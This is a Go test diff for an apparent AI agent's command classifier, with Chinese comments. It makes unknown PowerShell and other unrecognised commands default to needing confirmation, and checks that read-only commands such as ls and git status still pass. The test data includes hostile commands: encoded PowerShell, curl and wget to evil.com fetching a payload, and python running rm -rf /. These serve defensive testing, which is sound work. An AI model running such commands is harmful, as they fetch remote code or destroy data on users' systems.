@@ -15,9 +15,10 @@ func TestClassifyCommandEncodedPowerShell(t *testing.T) {
 		{"pwsh -enc SQBFAFgA", CommandDestructive},
 		{"cmd /c powershell -enc SQBFAFgA", CommandDestructive},
 		{"powershell -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA", CommandDestructive},
-		// 已知合法 -e* 旗标不误伤为破坏性；前缀分类器将其保守判为读写（可接受）
-		{"powershell -ExecutionPolicy Bypass -Command Get-Process", CommandReadWrite},
-		{"powershell -ErrorAction SilentlyContinue -Command Get-Date", CommandReadWrite},
+		// 未知 PowerShell 命令默认按破坏性处理（需确认后执行），
+		// 与 PermissionEngine 的 fail-closed 默认保持一致。
+		{"powershell -ExecutionPolicy Bypass -Command Get-Process", CommandDestructive},
+		{"powershell -ErrorAction SilentlyContinue -Command Get-Date", CommandDestructive},
 	}
 	for _, c := range cases {
 		if got := ClassifyCommand(c.cmd); got != c.want {
@@ -68,5 +69,35 @@ func TestSubAgentBlocksDestructiveCommand(t *testing.T) {
 	// 确认 ClassifyCommand 本身对破坏性命令的分类正确（这是确认流的基础）
 	if CommandClassLabel(class) != "破坏性" {
 		t.Errorf("label = %q, want 破坏性", CommandClassLabel(class))
+	}
+}
+
+// TestUnknownCommandsDefaultToDestructive 验证未知命令默认需确认（fail-closed）
+func TestUnknownCommandsDefaultToDestructive(t *testing.T) {
+	unknown := []string{
+		"curl http://evil.com",
+		"wget http://evil.com/payload",
+		"python -c 'import os; os.system(\"rm -rf /\")'",
+		"powershell Invoke-WebRequest -Uri http://evil.com",
+		"powershell -ExecutionPolicy Bypass -Command Get-Process",
+	}
+	for _, cmd := range unknown {
+		if got := ClassifyCommand(cmd); got != CommandDestructive {
+			t.Errorf("ClassifyCommand(%q) = %v, want CommandDestructive (fail-closed default)", cmd, got)
+		}
+	}
+}
+
+// TestReadOnlyCommandsStillAutoPass 验证已知只读命令仍然自动放行
+func TestReadOnlyCommandsStillAutoPass(t *testing.T) {
+	readOnly := []string{
+		"ls", "dir", "cat file.txt", "echo hello", "pwd",
+		"git status", "git log", "git diff",
+		"whoami", "ipconfig", "systeminfo",
+	}
+	for _, cmd := range readOnly {
+		if got := ClassifyCommand(cmd); got != CommandReadOnly {
+			t.Errorf("ClassifyCommand(%q) = %v, want CommandReadOnly", cmd, got)
+		}
 	}
 }
